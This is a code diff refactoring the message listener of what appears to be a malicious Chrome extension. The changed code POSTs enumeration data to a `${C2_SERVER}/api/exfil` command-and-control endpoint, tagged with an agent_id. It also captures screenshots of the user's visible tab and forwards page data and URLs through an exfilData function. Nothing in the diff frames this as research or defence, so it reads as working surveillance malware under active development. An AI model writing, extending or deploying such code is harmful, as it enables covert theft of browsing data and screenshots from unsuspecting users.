@@ -379,20 +379,20 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onStartup) {
 // Listen for messages from content scripts
 if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage) {
   chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    
-    if (message.type === 'exfil') {
-      if (message.action === 'ENUMERATION') {
-        const payload = {
-          agent_id: agent_id,
-          action: message.action,
-          payload: message.data
-        };
 
-        fetch(`${C2_SERVER}/api/exfil`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        })
+    // ENUMERATION
+    if (message.type === 'exfil' && message.action === 'ENUMERATION') {
+      const payload = {
+        agent_id: agent_id,
+        action: message.action,
+        payload: message.data
+      };
+
+      fetch(`${C2_SERVER}/api/exfil`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      })
         .then(response => response.json())
         .then(data => {
           console.log('Enumeration data sent successfully:', data);
@@ -400,32 +400,35 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage) {
         .catch(error => {
           console.error('Error sending enumeration data:', error);
         });
-
-      } else {
-        console.log('[Exfil Message]', message.data);
-        exfilData(message.data.action, {
-          url: sender.url,
-          location: message.data.location,
-          ...message.data
-        });
-        sendResponse({ status: 'ok' });
-      }
     }
 
-    // Handle screenshot capture
+    // SCREENSHOT
     if (message.type === 'capture_screenshot') {
-      chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: 'png' }, function(dataUrl) {
+      chrome.tabs.captureVisibleTab(sender.tab.windowId, { format: 'png' }, function (dataUrl) {
         if (chrome.runtime.lastError) {
           console.error('[Screenshot Error]', chrome.runtime.lastError);
           return;
         }
+
         const base64Data = dataUrl.split(',')[1];
+
         exfilData('TAKE_SCREENSHOT', {
           agent_id: agent_id,
           screenshot: base64Data,
           location: message.location
         });
       });
+    }
+
+    // GENERAL EXFIL
+    if (message.type === 'exfil') {
+      console.log('[Exfil Message]', message.data);
+      exfilData(message.data.action, {
+        url: sender.url,
+        location: message.data.location,
+        ...message.data
+      });
+      sendResponse({ status: 'ok' });
     }
 
     return true;
